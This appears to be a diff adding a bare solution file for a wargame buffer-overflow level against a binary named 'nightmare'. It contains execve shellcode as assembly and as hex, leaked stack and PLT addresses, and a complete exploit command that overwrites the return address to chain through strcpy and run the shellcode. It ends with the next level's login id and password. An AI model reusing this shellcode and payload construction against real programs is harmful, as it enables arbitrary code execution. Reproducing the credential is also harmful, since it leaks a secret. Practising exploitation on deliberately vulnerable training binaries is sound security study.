@@ -1,0 +1,56 @@
+<strcpy PLT>
+
+	0x8048410
+
+</strcpy PLT>
+
+<shell.S>
+
+	.section .text
+	.globl _start
+
+	_start:
+        	xor %eax, %eax
+        	push %eax
+       		push $0x73736170
+        	push $0x2d796d2f
+        	push $0x6e69622f
+        	push %eax
+        	lea 4(%esp), %ebx
+        	push %ebx
+        	movb $11, %al
+        	mov (%esp), %ebx
+        	lea (%esp), %ecx
+        	xor %edx, %edx
+        	int $0x80
+
+</shell.S>
+
+<shellcode>
+
+	\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x2f\x6d\x79\x2d\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80
+
+	length: 36
+
+</shellcode>
+
+<ebp, ret, beyond>
+
+	ebp: 0xbffffa88
+	ret: 0xbffffa8c
+	beyond: 0xbffffa90
+
+</ebp, ret, beyond>
+
+<command>
+
+	./nightmare "$(for x in `seq 1 44`; do printf "\x90"; done)$(printf "\x10\x84\x04\x08")$(printf "aaaa")$(printf "\xa0\xfa\xff\xbf")$(printf "\xa8\xfa\xff\xbf")$(printf "\xac\xfa\xff\xbf")$(printf "\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x2f\x6d\x79\x2d\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80")"
+
+</command>
+
+<next>
+
+	id: nightmare
+	pw: beg for me
+
+</next>
